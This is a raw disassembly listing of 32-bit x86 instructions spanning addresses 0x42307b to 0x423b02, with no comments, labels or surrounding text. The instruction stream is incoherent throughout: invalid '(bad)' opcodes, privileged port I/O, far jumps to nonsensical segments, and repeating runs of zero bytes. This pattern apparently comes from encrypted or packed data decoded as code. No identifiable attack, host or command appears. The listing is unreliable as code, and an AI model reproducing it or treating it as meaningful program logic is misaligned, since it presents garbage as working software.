  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebx+ebx*4+0x10a6a78],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0xc1000001,al
  42308d:	cmc    
  42308e:	inc    esi
  42308f:	pop    ebx
  423090:	cmp    eax,0x5be4442f
  423095:	jo     0x4230b1
  423097:	mov    ebp,0x6b2e15e2
  42309c:	ficom  DWORD PTR [ebx-0x7302228b]
  4230a2:	daa    
  4230a3:	ret    
  4230a4:	xor    eax,esi
  4230a6:	(bad)  
  4230a8:	test   al,0x2e
  4230aa:	jmp    0x10997d5e
  4230af:	inc    ecx
  4230b0:	jl     0x423082
  4230b2:	in     eax,0x82
  4230b4:	dec    edx
  4230b5:	jns    0x423098
  4230b7:	fcmovnu st,st(2)
  4230b9:	sti    
  4230ba:	xchg   BYTE PTR es:[edi],ch
  4230bd:	and    edi,ebx
  4230bf:	pop    ebp
  4230c0:	mov    al,0x70
  4230c2:	call   0xcf4590c6
  4230c7:	test   eax,0xc83fdaac
  4230cc:	mov    esi,0x3a2fa5b7
  4230d1:	ins    DWORD PTR es:[edi],dx
  4230d2:	add    al,0xc2
  4230d4:	xor    DWORD PTR [ebx-0x4c],edx
  4230d7:	sub    DWORD PTR [ecx-0x7ad78bc0],edx
  4230dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230de:	cmp    cl,BYTE PTR [esi-0x1236d652]
  4230e4:	pop    ss
  4230e5:	or     DWORD PTR [eax+eiz*1+0x49],edx
  4230e9:	fst    QWORD PTR [esp+eax*1]
  4230ec:	loope  0x4230b0
  4230ee:	ret    0xa54
  4230f1:	jne    0x4230a0
  4230f3:	mov    cl,0x19
  4230f5:	mov    al,ds:0x6487fa79
  4230fa:	aas    
  4230fb:	mov    dh,BYTE PTR [ebx]
  4230fd:	mov    al,0x16
  4230ff:	sbb    eax,0x5bdaca01
  423104:	mov    esi,0x9f644080
  423109:	test   DWORD PTR [edi+0x2cd7de4],ebx
  42310f:	out    dx,al
  423110:	js     0x423169
  423112:	ins    BYTE PTR es:[di],dx
  423114:	dec    edi
  423115:	(bad)  [eax-0x1]
  423118:	jns    0x42318b
  42311a:	push   ebx
  42311b:	mov    ecx,0x9e4562eb
  423120:	je     0x4230d1
  423122:	xchg   DWORD PTR [edi-0xb],edx
  423125:	in     al,dx
  423126:	scas   eax,DWORD PTR es:[edi]
  423127:	pop    edi
  423128:	sub    ebx,DWORD PTR [edi-0x561b3c38]
  42312e:	xchg   esi,ebp
  423130:	test   eax,0xf9afdc88
  423135:	sub    al,BYTE PTR [ebp+edx*2+0x6]
  423139:	mov    dh,0x77
  42313b:	addr16 ja 0x4230c2
  42313e:	mov    dl,dh
  423140:	aas    
  423141:	cmc    
  423142:	popa   
  423143:	dec    ebp
  423144:	jecxz  0x4230c9
  423146:	mov    al,0x74
  423148:	dec    esp
  423149:	lock mov bh,0x5d
  42314c:	pop    ebx
  42314d:	fistp  DWORD PTR [esi]
  42314f:	xchg   edx,eax
  423150:	cmp    al,0xfb
  423152:	pop    eax
  423153:	xlat   BYTE PTR ds:[ebx]
  423154:	stc    
  423155:	stc    
  423156:	retf   0x6f44
  423159:	push   0x42
  42315b:	gs ret 0x3a31
  42315f:	(bad)  
  423160:	mov    edi,0x93ca01ff
  423165:	and    DWORD PTR [eax+0x4aced017],ebx
  42316b:	mov    ch,BYTE PTR [ebx-0x6a42df67]
  423171:	jmp    0x916393d
  423176:	cmp    ch,0x3e
  423179:	icebp  
  42317a:	jnp    0x4231c2
  42317c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42317d:	and    ecx,ebx
  42317f:	aaa    
  423180:	je     0x423173
  423182:	aas    
  423183:	in     eax,dx
  423184:	scas   eax,DWORD PTR es:[edi]
  423185:	iret   
  423186:	and    BYTE PTR ds:0xe3a12332,dh
  42318c:	outs   dx,BYTE PTR ds:[esi]
  42318d:	dec    ebx
  42318e:	pop    esi
  42318f:	cdq    
  423190:	adc    al,BYTE PTR [eax]
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x27e3e3c9],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x78000001,al
  42320d:	mov    esi,gs
  42320f:	cmc    
  423210:	or     ecx,DWORD PTR [ebx+0x1777207b]
  423216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423217:	mov    esp,0x41be947e
  42321c:	loopne 0x423216
  42321e:	(bad)  
  423220:	cmp    al,0xac
  423222:	js     0x42325c
  423224:	dec    ebp
  423225:	inc    ecx
  423226:	arpl   WORD PTR [ebx],sp
  423228:	sahf   
  423229:	jmp    0x42326b
  42322b:	pop    ss
  42322c:	out    0x20,al
  42322e:	and    al,0xf5
  423230:	pop    esi
  423231:	ins    BYTE PTR es:[edi],dx
  423232:	fcomp  QWORD PTR [ebx+0x46]
  423235:	xor    BYTE PTR [eax-0x23],ah
  423238:	or     ebx,ebx
  42323a:	xchg   ecx,eax
  42323b:	aad    0x3b
  42323d:	scas   al,BYTE PTR es:[edi]
  42323e:	aam    0x97
  423240:	mov    dh,0x6
  423242:	test   al,0xba
  423244:	or     al,0x5c
  423246:	dec    ebp
  423247:	jmp    0x423274
  423249:	xor    DWORD PTR [eax+0x48ab6856],edx
  42324f:	imul   esi,DWORD PTR [ebx+0x42197fef],0xb166b3d
  423259:	xor    cl,BYTE PTR [ebx+0x4b]
  42325c:	icebp  
  42325d:	gs push 0x23
  423260:	cmovg  ecx,DWORD PTR [ebp+0x35394328]
  423267:	cmc    
  423268:	icebp  
  423269:	popa   
  42326a:	xlat   BYTE PTR ds:[ebx]
  42326b:	(bad)  
  42326c:	inc    edi
  42326d:	fs inc esp
  42326f:	and    DWORD PTR [eax],ebx
  423271:	mov    bl,0x50
  423273:	mov    ch,BYTE PTR [edx-0x4a1ae79e]
  423279:	xchg   dh,dh
  42327b:	and    DWORD PTR [ecx-0x19],ebx
  42327e:	push   ebx
  42327f:	jmp    0x2058:0xf1fe5a15
  423286:	div    BYTE PTR [esi-0x337984cd]
  42328c:	std    
  42328d:	scas   al,BYTE PTR es:[edi]
  42328e:	nop
  42328f:	xor    esi,DWORD PTR [esi+0x55]
  423292:	push   edi
  423293:	mov    ah,0xe1
  423295:	shl    bh,cl
  423297:	push   0x7a
  423299:	mov    esi,0x1d5e822b
  42329e:	fucompp 
  4232a0:	inc    esp
  4232a1:	call   0x6c15:0xb8af0a17
  4232a8:	push   esp
  4232a9:	inc    edi
  4232aa:	sbb    al,0xb
  4232ac:	in     al,0xf1
  4232ae:	es push edi
  4232b0:	xchg   esi,eax
  4232b1:	in     al,0x39
  4232b3:	jno    0x4232b6
  4232b5:	mov    gs,WORD PTR [ebp+eax*1-0x5835e6ff]
  4232bc:	loop   0x423334
  4232be:	fadd   st(1),st
  4232c0:	pop    ebx
  4232c1:	mov    dh,0x13
  4232c3:	mov    ch,0x68
  4232c5:	push   ebx
  4232c6:	push   cs
  4232c7:	je     0x4232ca
  4232c9:	inc    edi
  4232ca:	pop    edi
  4232cb:	sbb    DWORD PTR [ecx-0x6b],eax
  4232ce:	(bad)  
  4232cf:	cmp    eax,esp
  4232d1:	stos   DWORD PTR es:[edi],eax
  4232d2:	iret   
  4232d3:	fwait
  4232d4:	popf   
  4232d5:	fstp   QWORD PTR [ecx+0x207085fb]
  4232db:	(bad)  
  4232dc:	xchg   edi,eax
  4232dd:	add    edx,DWORD PTR [ecx+eax*2+0x40c04ac7]
  4232e4:	ins    DWORD PTR es:[edi],dx
  4232e5:	(bad)  ds:0x3db6e8f5
  4232eb:	dec    esi
  4232ec:	xlat   BYTE PTR ds:[ebx]
  4232ed:	inc    eax
  4232ee:	pusha  
  4232ef:	pusha  
  4232f0:	mov    BYTE PTR [ebp-0x17f47505],dl
  4232f6:	xchg   DWORD PTR [edi+esi*8+0x50],esp
  4232fa:	dec    edx
  4232fb:	cmp    eax,0xe701cafc
  423300:	stos   DWORD PTR es:[edi],eax
  423301:	adc    ah,BYTE PTR [eax+esi*4+0xd2b34be]
  423308:	mov    ds:0xfa243f71,eax
  42330d:	rcl    DWORD PTR [esi],1
  42330f:	pushf  
  423310:	(bad)  
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x22cb0f44
  423382:	push   cs
  423383:	cmp    ecx,DWORD PTR [ebx]
  423385:	js     0x423388
  423387:	add    BYTE PTR ds:0xeb000001,al
  42338d:	inc    esp
  42338e:	or     dh,al
  423390:	fwait
  423391:	pop    ebp
  423392:	pop    esp
  423393:	cwde   
  423394:	sbb    al,0x2a
  423396:	lods   eax,DWORD PTR ds:[esi]
  423397:	out    0x83,al
  423399:	test   ch,bl
  42339b:	retf   
  42339c:	dec    ebx
  42339d:	shl    BYTE PTR [edx+eiz*2+0x534aa86b],1
  4233a4:	out    0x4b,al
  4233a6:	dec    esi
  4233a7:	and    edi,DWORD PTR [ecx]
  4233a9:	shl    BYTE PTR [edx+0x5c],cl
  4233ac:	xor    eax,0x59229443
  4233b1:	fist   DWORD PTR [esi]
  4233b3:	add    edi,esi
  4233b5:	xlat   BYTE PTR ds:[ebx]
  4233b6:	sbb    eax,0xdc718f5c
  4233bb:	sub    DWORD PTR [ebx+0x31],0x6f
  4233bf:	xor    DWORD PTR [edx+0x52eb9446],eax
  4233c5:	enter  0xc13f,0x10
  4233c9:	popa   
  4233ca:	pop    ds
  4233cb:	xlat   BYTE PTR ds:[ebx]
  4233cc:	pushf  
  4233cd:	pushf  
  4233ce:	mov    WORD PTR ds:0xec3bdc52,?
  4233d4:	aad    0x90
  4233d6:	jb     0x423365
  4233d8:	rcr    BYTE PTR [ebx-0x7f510d5b],0x88
  4233df:	inc    edi
  4233e0:	push   eax
  4233e1:	and    al,0xa2
  4233e3:	push   ebp
  4233e4:	push   ecx
  4233e5:	push   ds
  4233e6:	stos   BYTE PTR es:[edi],al
  4233e7:	enter  0x2c03,0x2f
  4233eb:	aas    
  4233ec:	pop    es
  4233ed:	cdq    
  4233ee:	pop    esp
  4233ef:	imul   ebp,DWORD PTR [esi],0xffffff9e
  4233f2:	mov    ebx,0x2eb6f226
  4233f7:	cmp    BYTE PTR [esi+0x27],bl
  4233fa:	cmp    ah,al
  4233fc:	outs   dx,DWORD PTR ds:[esi]
  4233fd:	and    cl,BYTE PTR [edi+0x62]
  423400:	(bad)  
  423401:	call   0x8b19:0x291648ff
  423408:	xor    eax,0x8dd39a0f
  42340d:	popf   
  42340e:	xchg   DWORD PTR [edi-0x6bf22655],edx
  423414:	nop
  423415:	push   edi
  423416:	and    al,0xce
  423418:	dec    edi
  423419:	retf   0xc2aa
  42341c:	inc    ebp
  42341d:	jp     0x42339f
  42341f:	test   DWORD PTR [esi+0x6b],edx
  423422:	jg     0x4233f5
  423424:	(bad)  
  423425:	loop   0x4233c9
  423427:	mov    dl,0x51
  423429:	inc    esi
  42342a:	jnp    0x423488
  42342c:	pop    es
  42342d:	push   cs
  42342e:	xchg   ah,al
  423430:	mov    ebp,0x2fd5aaf1
  423435:	push   ss
  423436:	pop    DWORD PTR [edx]
  423438:	dec    ecx
  423439:	pop    eax
  42343a:	aam    0x1f
  42343c:	cmp    DWORD PTR [edi-0x43],0xffffffc5
  423440:	hlt    
  423441:	xlat   BYTE PTR ds:[ebx]
  423442:	mov    eax,0x8faafa80
  423447:	es ret 0xf373
  42344b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42344c:	mov    ebx,0x10294044
  423451:	and    BYTE PTR ss:[ebp-0x131d5a8a],0xe4
  423459:	inc    eax
  42345a:	xchg   esi,eax
  42345b:	push   esi
  42345c:	popa   
  42345d:	mov    al,cl
  42345f:	push   ds
  423460:	jge    0x4233ed
  423462:	test   DWORD PTR [ecx],0x6fe21369
  423468:	je     0x4234d2
  42346a:	dec    eax
  42346b:	xor    BYTE PTR [eax-0x5a],al
  42346e:	jb     0x4234b7
  423470:	sub    BYTE PTR [ebx],0xc3
  423473:	or     BYTE PTR [ecx-0x68e50481],ch
  423479:	in     al,dx
  42347a:	sahf   
  42347b:	or     eax,0x2ebd7169
  423480:	aas    
  423481:	and    DWORD PTR [ecx+0x74],edi
  423484:	aad    0xf
  423486:	push   ebx
  423487:	push   ss
  423488:	dec    eax
  423489:	jmp    0x423500
  42348b:	push   esp
  42348c:	push   0x8c5818ad
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x471f:0xadf467bf
  423501:	rcl    BYTE PTR ds:[eax+edx*1],0x79
  423506:	add    DWORD PTR [eax],eax
  423508:	add    eax,0xa0000001
  42350d:	cwde   
  42350e:	add    BYTE PTR [ebx+0x68],bh
  423511:	mov    WORD PTR [esi],fs
  423513:	mov    cl,0xc9
  423515:	jns    0x4234fd
  423517:	dec    eax
  423518:	mov    DWORD PTR [edx+ebx*4],edi
  42351b:	enter  0xb0c9,0xcd
  42351f:	cmp    dl,bl
  423521:	mov    esp,DWORD PTR [ebx]
  423523:	push   eax
  423524:	jno    0x423573
  423526:	ret    0xd4e9
  423529:	xchg   esp,eax
  42352a:	mov    esi,es
  42352c:	fwait
  42352d:	xor    edi,DWORD PTR [eax+0x3e]
  423530:	inc    ecx
  423531:	lods   al,BYTE PTR ds:[esi]
  423532:	mov    ah,0xbe
  423534:	and    edi,esi
  423536:	cli    
  423537:	loope  0x423507
  423539:	mov    cl,0xfe
  42353b:	fstp   QWORD PTR [edi]
  42353d:	add    eax,0xae632402
  423542:	jg     0x4235aa
  423544:	jl     0x423581
  423546:	pop    eax
  423547:	sbb    al,0xb0
  423549:	pop    esp
  42354a:	or     cl,BYTE PTR [edx-0x5b]
  42354d:	ret    0x7a61
  423550:	(bad)  
  423551:	ss mov ch,0x4f
  423554:	arpl   WORD PTR [ebp-0x39f5ee51],dx
  42355a:	push   cs
  42355b:	dec    esp
  42355c:	mov    eax,ds:0x79fac2c2
  423561:	(bad)  
  423562:	xor    BYTE PTR [ebx+0x470b0c42],bl
  423568:	fadd   st(0),st
  42356a:	mov    edx,0x2a79f57e
  42356f:	push   0xb28ad548
  423574:	out    0x11,eax
  423576:	push   ss
  423577:	or     dh,ah
  423579:	int3   
  42357a:	test   eax,0xc3add6f5
  42357f:	(bad)  
  423580:	imul   edx,DWORD PTR [ecx-0x25596675],0xfffffffe
  423587:	xchg   DWORD PTR [ebp-0x726c61fc],eax
  42358d:	arpl   WORD PTR [esi-0x24],ax
  423590:	shl    DWORD PTR [ebx-0x6040514],cl
  423596:	mov    ecx,esi
  423598:	(bad)  
  423599:	retf   0xc873
  42359c:	rsqrtps xmm4,XMMWORD PTR [ebx*1-0x10d72ec1]
  4235a4:	sub    dh,BYTE PTR [ecx]
  4235a6:	jecxz  0x4235a4
  4235a8:	and    BYTE PTR [ebp+0x68],0xb4
  4235ac:	es jle 0x423605
  4235af:	pop    ds
  4235b0:	loop   0x423535
  4235b2:	(bad)  
  4235b3:	lods   eax,DWORD PTR ds:[esi]
  4235b4:	not    DWORD PTR [ebx+0x41]
  4235b7:	push   eax
  4235b8:	xchg   esi,eax
  4235b9:	and    bl,BYTE PTR [ebx]
  4235bb:	in     al,dx
  4235bc:	aas    
  4235bd:	xor    ecx,ebp
  4235bf:	add    al,0x18
  4235c1:	leave  
  4235c2:	mov    DWORD PTR [ecx+ebp*4+0x3c],0x6cba6ee1
  4235ca:	sahf   
  4235cb:	inc    esi
  4235cc:	cdq    
  4235cd:	adc    al,0xd8
  4235cf:	outs   dx,DWORD PTR ds:[esi]
  4235d0:	mov    BYTE PTR [esi],bl
  4235d2:	call   0x73efc1f8
  4235d7:	std    
  4235d8:	leave  
  4235d9:	hlt    
  4235da:	inc    eax
  4235db:	mov    al,ds:0x7d6880e9
  4235e0:	mov    ch,BYTE PTR [eax-0x35]
  4235e3:	dec    edx
  4235e4:	pop    ebp
  4235e5:	imul   esp,ebp,0x13
  4235e8:	rdmsr  
  4235ea:	jne    0x423594
  4235ec:	jmp    0x9e84:0x2f95
  4235f2:	cld    
  4235f3:	outs   dx,DWORD PTR ds:[esi]
  4235f4:	jb     0x423583
  4235f6:	mov    WORD PTR [edx],ds
  4235f8:	jg     0x423678
  4235fa:	ror    ecx,0x1b
  4235fd:	pushf  
  4235fe:	stos   BYTE PTR es:[edi],al
  4235ff:	popf   
  423600:	gs inc edx
  423602:	sar    edi,0x71
  423605:	mov    bh,0xa9
  423607:	add    DWORD PTR [ebx],ecx
  423609:	jecxz  0x423671
  42360b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42360c:	xchg   ecx,eax
  42360d:	shl    cl,0x2c
  423610:	jg     0x423612
	...
  423672:	add    BYTE PTR [eax],al
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	mov    al,0x6
  423682:	fnstcw WORD PTR [ecx]
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    BYTE PTR [edx+0x72272517],dh
  423691:	ret    
  423692:	je     0x42370d
  423694:	xchg   ebx,eax
  423695:	sahf   
  423696:	cld    
  423697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423698:	mov    ebx,edx
  42369a:	ja     0x423657
  42369c:	sbb    ch,cl
  42369e:	loopne 0x423700
  4236a0:	gs mov ebp,0x4ab241de
  4236a6:	pop    esp
  4236a7:	(bad)  
  4236a9:	mov    ebp,DWORD PTR [eax+0x67]
  4236ac:	xchg   edi,eax
  4236ad:	cs cld 
  4236af:	xor    DWORD PTR [eax],0xffffff96
  4236b2:	scas   al,BYTE PTR es:[edi]
  4236b3:	adc    eax,0x909e8512
  4236b8:	jne    0x4236c6
  4236ba:	pop    ss
  4236bb:	xchg   esp,eax
  4236bc:	data16 int3 
  4236be:	or     ecx,DWORD PTR [ebp+0x60]
  4236c1:	jmp    0xea6fae1d
  4236c6:	mov    bl,0x32
  4236c8:	fisttp WORD PTR ds:0xeaf82f11
  4236ce:	inc    esi
  4236cf:	aaa    
  4236d0:	dec    edx
  4236d1:	adc    ah,dh
  4236d3:	int3   
  4236d4:	fs arpl cx,bp
  4236d7:	push   cs
  4236d8:	push   edx
  4236d9:	sub    eax,0x35b5a875
  4236de:	pop    eax
  4236df:	mov    ebx,0xdafae29b
  4236e4:	sahf   
  4236e5:	js     0x423736
  4236e7:	mov    bl,0x49
  4236e9:	mov    bl,0x2d
  4236eb:	mov    esp,0x5064b269
  4236f0:	or     eax,DWORD PTR [edx+esi*2+0x7aad8dae]
  4236f7:	xor    ebp,ecx
  4236f9:	dec    ecx
  4236fb:	jp     0x4236cb
  4236fd:	pop    DWORD PTR [ebp-0x52]
  423700:	leave  
  423701:	add    eax,0x58706789
  423706:	xor    ah,BYTE PTR [ecx]
  423708:	mov    ah,0x70
  42370a:	or     edx,eax
  42370c:	dec    esi
  42370d:	cwde   
  42370e:	cmp    BYTE PTR [esi+0x13da5524],0x94
  423715:	jg     0x42370c
  423717:	test   DWORD PTR [eax+ebx*8+0x65],esi
  42371b:	fild   DWORD PTR [ebx-0x46d5428e]
  423721:	mov    al,0xfc
  423723:	push   0x51
  423725:	inc    esp
  423726:	push   esi
  423727:	or     BYTE PTR [esi],ch
  423729:	adc    cl,dh
  42372b:	pop    ebx
  42372c:	pop    es
  42372d:	out    0x17,eax
  42372f:	sbb    DWORD PTR [edx+0x72],esp
  423732:	imul   DWORD PTR [ebx-0x7a]
  423735:	jmp    0xed132e67
  42373a:	hlt    
  42373b:	adc    dh,cl
  42373d:	jge    0x423711
  42373f:	sub    DWORD PTR [edx+ebx*2+0x12],eax
  423743:	call   0x86065660
  423748:	mov    ah,0xd2
  42374a:	js     0x423711
  42374c:	mov    BYTE PTR [esi+0x3e069b18],0xcb
  423753:	loope  0x423798
  423755:	aad    0xcc
  423757:	mov    esp,0xa5665d8f
  42375c:	xchg   di,ax
  42375e:	jnp    0x4236fa
  423760:	jg     0x4236ec
  423762:	jb     0x423784
  423764:	inc    eax
  423765:	pop    edx
  423766:	push   edx
  423767:	ret    0x51fa
  42376a:	add    eax,0x874a5bce
  42376f:	out    0x7f,al
  423771:	mov    dh,0x1a
  423773:	mov    ebp,0x61102f2d
  423778:	loop   0x42375a
  42377a:	xlat   BYTE PTR ds:[ebx]
  42377b:	pop    edi
  42377c:	scas   eax,DWORD PTR es:[edi]
  42377d:	xor    al,0x93
  42377f:	cmp    al,0x83
  423781:	mov    DWORD PTR [eax-0xbdba63d],ebp
  423787:	fs in  eax,0x1b
  42378a:	push   edx
  42378b:	nop
  42378c:	scas   al,BYTE PTR es:[edi]
  42378d:	mov    eax,0x37c1a9
	...
  4237f2:	add    BYTE PTR [eax],al
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xec616acf
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x4e000001
  42380d:	daa    
  42380e:	pop    ds
  42380f:	sbb    al,0xa3
  423811:	adc    DWORD PTR [ebp-0x4b],0x7f
  423815:	adc    ch,dl
  423817:	ret    
  423818:	int3   
  423819:	(bad)  
  42381b:	pop    ss
  42381c:	(bad)
  42381f:	fld    DWORD PTR [ecx]
  423821:	ja     0x423827
  423823:	fcmovnu st,st(6)
  423825:	fs or  ah,dl
  423828:	arpl   bx,di
  42382a:	icebp  
  42382b:	(bad)
  42382e:	jecxz  0x4237c6
  423830:	test   dl,dh
  423832:	add    edx,DWORD PTR [edx]
  423834:	mov    ah,bh
  423836:	fst    st(5)
  423838:	pop    edx
  423839:	bound  ebp,QWORD PTR [ebx+0x7c]
  42383c:	or     DWORD PTR [esp+ebx*4-0x4ada7f07],edi
  423843:	popa   
  423844:	sub    DWORD PTR ds:[esi-0xa],ecx
  423848:	xchg   edi,eax
  423849:	sbb    ch,BYTE PTR [ebx+0x9ebfa21]
  42384f:	dec    ebp
  423850:	add    eax,eax
  423852:	mov    edx,0xeb548545
  423857:	out    0xd5,al
  423859:	icebp  
  42385a:	inc    ebp
  42385b:	and    ebp,DWORD PTR [ebx]
  42385d:	std    
  42385e:	je     0x42386f
  423860:	cwde   
  423861:	retf   
  423862:	pop    DWORD PTR [edi+0xb]
  423865:	(bad)  
  423866:	ds push ds
  423868:	dec    esi
  423869:	outs   dx,BYTE PTR ds:[esi]
  42386a:	dec    ecx
  42386b:	pop    ebp
  42386c:	mov    ds:0xb1fdd357,al
  423871:	imul   esp,DWORD PTR [esi],0xfba78857
  423877:	cwde   
  423878:	xchg   esi,eax
  423879:	dec    ebx
  42387a:	xchg   edx,eax
  42387b:	test   BYTE PTR [edx-0x13],ah
  42387e:	ins    BYTE PTR es:[edi],dx
  42387f:	mov    WORD PTR [ebp+0x23],?
  423882:	(bad)  
  423883:	mov    ebx,0xf71b1ac8
  423888:	fisub  DWORD PTR [eax]
  42388a:	imul   DWORD PTR [eax-0x15]
  42388d:	div    ecx
  42388f:	das    
  423890:	pop    edi
  423891:	mov    al,0xc0
  423893:	cmp    eax,0xf8f52c4c
  423898:	mov    ds:0x983e2841,al
  42389d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42389e:	aam    0x7f
  4238a0:	fnsave [ebp+0x6c]
  4238a3:	aas    
  4238a4:	(bad)  
  4238a5:	xor    BYTE PTR [ecx],dh
  4238a7:	lods   eax,DWORD PTR ds:[esi]
  4238a8:	iret   
  4238a9:	dec    eax
  4238aa:	inc    esp
  4238ab:	clc    
  4238ac:	dec    ebx
  4238ad:	mov    cl,0xf5
  4238af:	pop    ss
  4238b0:	and    eax,0x939b9161
  4238b5:	add    al,0x5
  4238b7:	xor    ah,BYTE PTR [ecx]
  4238b9:	jge    0x4238b1
  4238bb:	adc    DWORD PTR [esi+edi*4],ecx
  4238be:	inc    eax
  4238bf:	add    ah,ah
  4238c1:	loop   0x423904
  4238c3:	add    al,0xa4
  4238c5:	inc    edx
  4238c6:	inc    ebx
  4238c7:	stc    
  4238c8:	cli    
  4238c9:	cld    
  4238ca:	mov    gs,WORD PTR ds:0x61b57cd3
  4238d0:	mov    cl,0xc4
  4238d2:	pop    esp
  4238d3:	cmp    esp,DWORD PTR [eax]
  4238d5:	or     ebx,DWORD PTR [eax+esi*8+0x72861f5b]
  4238dc:	or     eax,DWORD PTR [edx]
  4238de:	scas   eax,DWORD PTR es:[edi]
  4238df:	push   0x7d
  4238e1:	dec    edx
  4238e2:	js     0x423959
  4238e4:	cmp    ah,0xa3
  4238e7:	mov    esi,0x60b46adf
  4238ec:	sbb    al,0x1d
  4238ee:	mov    ds:0x4005c6e6,eax
  4238f3:	and    esi,esp
  4238f5:	inc    ebp
  4238f6:	pusha  
  4238f7:	rol    DWORD PTR [edx+0x22],1
  4238fa:	fld    DWORD PTR ds:0x208b2ce8
  423900:	xchg   esp,eax
  423901:	mov    ebp,0xa38acc8c
  423906:	jmp    0x36ee71b3
  42390b:	test   al,0x28
  42390d:	fcomp  DWORD PTR [edi]
  42390f:	mov    WORD PTR [eax+eax*1],ds
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x7bcc2bbd
  423982:	and    DWORD PTR [edi],edi
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0xf2000001,al
  42398d:	(bad)  [edi-0x4a82fad7]
  423993:	mov    ds:0xe649f48b,al
  423998:	data16 sahf 
  42399a:	jne    0x4239c2
  42399c:	aad    0xe2
  42399e:	or     BYTE PTR [edi+edi*8+0x71bb7626],al
  4239a5:	lods   eax,DWORD PTR ds:[esi]
  4239a6:	xor    BYTE PTR [ecx],cl
  4239a8:	enter  0x8743,0x12
  4239ac:	xor    DWORD PTR [edi+0x3cfa44e0],ecx
  4239b2:	jge    0x42395f
  4239b4:	neg    DWORD PTR [ebx]
  4239b6:	xchg   edx,eax
  4239b7:	mov    edx,0x899b5113
  4239bc:	sbb    ah,dh
  4239be:	or     eax,0xc927c4ed
  4239c3:	in     al,0x14
  4239c5:	xor    dh,BYTE PTR [ebx-0x4f1cb79d]
  4239cb:	push   ds
  4239cc:	fs xchg esp,eax
  4239ce:	inc    eax
  4239cf:	je     0x4239ff
  4239d1:	mov    edi,edi
  4239d3:	or     eax,0x320b7514
  4239d8:	sub    dl,ch
  4239da:	xchg   ebx,eax
  4239db:	pop    ss
  4239dc:	adc    BYTE PTR [ebp-0x3b28e47a],cl
  4239e2:	xchg   ebx,eax
  4239e3:	mov    BYTE PTR [ebx+0x18],ah
  4239e6:	or     edx,edi
  4239e8:	popf   
  4239e9:	xor    edi,0x488824bc
  4239ef:	add    BYTE PTR [edi],bh
  4239f1:	and    dh,dh
  4239f3:	test   eax,0xc3ac0df9
  4239f8:	hlt    
  4239f9:	aad    0x33
  4239fb:	sbb    ah,BYTE PTR ss:[edi+0x707253ac]
  423a02:	int3   
  423a03:	mov    esp,ebx
  423a05:	fwait
  423a06:	mov    ds:0x434038da,eax
  423a0b:	pop    es
  423a0c:	mov    BYTE PTR [eax+ebx*8+0x39],0xe2
  423a11:	adc    eax,0x49594170
  423a16:	retf   
  423a17:	fild   DWORD PTR [edi]
  423a19:	not    DWORD PTR [ecx]
  423a1b:	loope  0x4239b8
  423a1d:	nop
  423a1e:	xchg   esp,eax
  423a1f:	mov    es,WORD PTR [eax-0x2a]
  423a22:	pop    ebx
  423a23:	mov    dh,0x17
  423a25:	sahf   
  423a26:	dec    ecx
  423a27:	enter  0xe7a,0x9a
  423a2b:	xchg   esp,eax
  423a2c:	jae    0x423a15
  423a2e:	and    al,0xa4
  423a30:	sub    al,0x9a
  423a32:	and    cl,BYTE PTR [edi]
  423a34:	jmp    0xd549:0x76571e9
  423a3b:	loopne 0x423ab9
  423a3d:	pop    esi
  423a3e:	mov    al,ds:0x4ce355b0
  423a43:	sub    edi,DWORD PTR [ebp-0x16]
  423a46:	add    al,BYTE PTR ds:0x9dc5e24c
  423a4c:	add    DWORD PTR [edx],esp
  423a4e:	jne    0x4239d8
  423a50:	aas    
  423a51:	out    dx,eax
  423a52:	xor    DWORD PTR [ebp+eax*8-0x54],0xffffff94
  423a57:	ror    BYTE PTR [edx-0x115d8799],0x77
  423a5e:	jmp    0x53fb631f
  423a63:	mov    dl,0x28
  423a65:	jmp    0xa8d7:0x7749db3d
  423a6c:	jmp    0xe0cccc20
  423a71:	in     al,dx
  423a72:	inc    ebp
  423a73:	mov    ecx,0xfffc07cc
  423a78:	leave  
  423a79:	mov    ecx,0x5e4527df
  423a7e:	push   es
  423a7f:	pusha  
  423a80:	and    BYTE PTR [edx-0x483c4500],0xaa
  423a87:	cwde   
  423a88:	out    0x7e,eax
  423a8a:	in     eax,0x58
  423a8c:	mov    dh,BYTE PTR [ebp+0x9f079d]
	...
  423af2:	add    BYTE PTR [eax],al
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	dec    ebx
  423b01:	fwait
  423b02:	jge    0x423b04
